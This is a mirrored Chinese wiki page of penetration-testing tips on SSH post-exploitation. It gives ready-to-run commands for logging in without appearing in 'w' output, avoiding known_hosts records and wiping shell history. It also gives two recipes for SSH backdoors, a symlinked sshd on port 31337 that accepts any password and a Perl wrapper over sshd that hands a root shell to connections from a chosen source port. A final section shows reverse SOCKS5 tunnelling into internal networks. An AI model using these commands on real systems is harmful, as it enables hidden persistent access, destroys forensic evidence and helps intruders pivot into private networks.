<!DOCTYPE html>
<html lang="zh" dir="ltr">

<!-- Mirrored from wiki.wooyun.org/_export/xhtml/pentest:ssh相关操作 by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 04 Dec 2015 03:25:19 GMT -->
<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
<head>
  <meta charset="utf-8" />
  <title>pentest:ssh相关操作</title>
<meta name="generator" content="DokuWiki"/>
<meta name="robots" content="index,follow"/>
<meta name="keywords" content="pentest,ssh相关操作"/>
<link rel="search" type="application/opensearchdescription+xml" href="../../lib/exe/opensearch.php" title="WooYun WiKi"/>
<link rel="start" href="../../index.html"/>
<link rel="contents" href="../../pentest_ssh%e7%9b%b8%e5%85%b3%e6%93%8d%e4%bd%9cdecf.html?do=index" title="网站地图"/>
<link rel="alternate" type="application/rss+xml" title="最近更改" href="../../feed.php"/>
<link rel="alternate" type="application/rss+xml" title="当前命名空间" href="../../feeda764.php?mode=list&amp;ns=pentest"/>
<link rel="alternate" type="text/html" title="纯HTML" href="pentest_ssh%e7%9b%b8%e5%85%b3%e6%93%8d%e4%bd%9c.html"/>
<link rel="alternate" type="text/plain" title="Wiki Markup 语言" href="../raw/ssh%e7%9b%b8%e5%85%b3%e6%93%8d%e4%bd%9c.txt"/>
<link rel="canonical" href="../../pentest_ssh%e7%9b%b8%e5%85%b3%e6%93%8d%e4%bd%9c.html"/>
<link rel="stylesheet" type="text/css" href="../../lib/exe/css70b4.css?t=bootstrap3&amp;tseed=6dcbf66232c3759c28d0e8f6d9cdfd22"/>
<script type="text/javascript">/*<![CDATA[*/var NS='pentest';var JSINFO = {"id":"pentest:ssh\u76f8\u5173\u64cd\u4f5c","namespace":"pentest","plugin_codeprettify":{"loader_base":"\/lib\/plugins\/codeprettify\/google-code-prettify"}};
/*!]]>*/</script>
<script type="text/javascript" charset="utf-8" src="../../lib/exe/js1e16.php?tseed=6dcbf66232c3759c28d0e8f6d9cdfd22"></script>
<script type="text/javascript" charset="utf-8" src="../../lib/plugins/codeprettify/google-code-prettify/run_prettifyeb11.js?lang=css"></script>
</head>
<body>
<div class="dokuwiki export">

<p>
我一般先这么登录，不让对方执行w的时候看到我
</p>
<pre class="code">ssh -T <a class="__cf_email__" href="../../cdn-cgi/l/email-protection.html" data-cfemail="1e6c71716a5e26302630263026">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/javascript">
/* <![CDATA[ */!function(){try{var t="currentScript"in document?document.currentScript:function(){for(var t=document.getElementsByTagName("script"),e=t.length;e--;)if(t[e].getAttribute("data-cfhash"))return t[e]}();if(t&&t.previousSibling){var e,r,n,i,c=t.previousSibling,a=c.getAttribute("data-cfemail");if(a){for(e="",r=parseInt(a.substr(0,2),16),n=2;a.length-n;n+=2)i=parseInt(a.substr(n,2),16)^r,e+=String.fromCharCode(i);e=document.createTextNode(e),c.parentNode.replaceChild(e,c)}t.parentNode.removeChild(t);}}catch(u){}}()/* ]]> */</script> bin/sh -i</pre>

<p>
还有一个技巧：远程登录时防止被记录到know<em>hosts文件（默认为~/.ssh/know</em>hosts）
</p>
<pre class="code">ssh -o UserKnownHostsFile=/dev/null -T user@host /bin/bash -i</pre>

<p>
远程登录SSH后第一件事
</p>
<pre class="code">unset HISTFILE;export HISTFILE=;export HISTFILE=/dev/null;export HISTSIZE=0;export HISTFILESIZE=0;export HISTIGNORE=*;export HISTCONTROL=ignorespace</pre>

<p>
常见的两种方法建立SSH后门
</p>

<p>
1.后门端口为31337，用root/bin/ftp/mail当用户名，密码随意，就可登陆
</p>
<pre class="code">mickey@vic:~# ln -sf /usr/sbin/sshd /tmp/su;/tmp/su -oPort=31337;</pre>

<p>
2.使用源端口31337登录，就可以获得SHELL，端口还是默认的SSH端口
</p>
<pre class="code">[root@localhost ~]# cd /usr/sbin
[root@localhost sbin]# mv sshd ../bin
[root@localhost sbin]# echo &#039;#!/usr/bin/perl&#039; &gt;sshd
[root@localhost sbin]# echo &#039;exec &quot;/bin/sh&quot; if (getpeername(STDIN) =~ /^..4A/);&#039; &gt;&gt;sshd
[root@localhost sbin]# echo &#039;exec {&quot;/usr/bin/sshd&quot;} &quot;/usr/sbin/sshd&quot;,@ARGV,&#039; &gt;&gt;sshd
[root@localhost sbin]# chmod u+x sshd
[root@localhost sbin]# /etc/init.d/sshd restart</pre>

<p>
用SSH做socks5代理，并且转发到公网的IP
</p>
<pre class="code">ssh -fND 127.0.0.1:8888 <a class="__cf_email__" href="../../cdn-cgi/l/email-protection.html" data-cfemail="8fe2e6ece4eaf6cfbebdb8a1bfa1bfa1be">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/javascript">
/* <![CDATA[ */!function(){try{var t="currentScript"in document?document.currentScript:function(){for(var t=document.getElementsByTagName("script"),e=t.length;e--;)if(t[e].getAttribute("data-cfhash"))return t[e]}();if(t&&t.previousSibling){var e,r,n,i,c=t.previousSibling,a=c.getAttribute("data-cfemail");if(a){for(e="",r=parseInt(a.substr(0,2),16),n=2;a.length-n;n+=2)i=parseInt(a.substr(n,2),16)^r,e+=String.fromCharCode(i);e=document.createTextNode(e),c.parentNode.replaceChild(e,c)}t.parentNode.removeChild(t);}}catch(u){}}()/* ]]> */</script>   </pre>

<p>
做SOCKS5代理,这里需要提供一个SSH登录账号
</p>
<pre class="code">ssh -fNR 8888:127.0.0.1:8888 <a class="__cf_email__" href="../../cdn-cgi/l/email-protection.html" data-cfemail="fa979399919f83bac2d4c2d4c2d4c2">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/javascript">
/* <![CDATA[ */!function(){try{var t="currentScript"in document?document.currentScript:function(){for(var t=document.getElementsByTagName("script"),e=t.length;e--;)if(t[e].getAttribute("data-cfhash"))return t[e]}();if(t&&t.previousSibling){var e,r,n,i,c=t.previousSibling,a=c.getAttribute("data-cfemail");if(a){for(e="",r=parseInt(a.substr(0,2),16),n=2;a.length-n;n+=2)i=parseInt(a.substr(n,2),16)^r,e+=String.fromCharCode(i);e=document.createTextNode(e),c.parentNode.replaceChild(e,c)}t.parentNode.removeChild(t);}}catch(u){}}()/* ]]> */</script></pre>

<p>
把socks5代理反弹到你公网的SSH服务器，这里输入的是你公网SSH服务器的vpn用户的密码
</p>

<p>
最后在本地设置SOCKS5代理，127.0.0.1:8888 
就能连接内网任意的服务器了。
</p>
</div>
</body>

<!-- Mirrored from wiki.wooyun.org/_export/xhtml/pentest:ssh相关操作 by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 04 Dec 2015 03:25:19 GMT -->
</html>
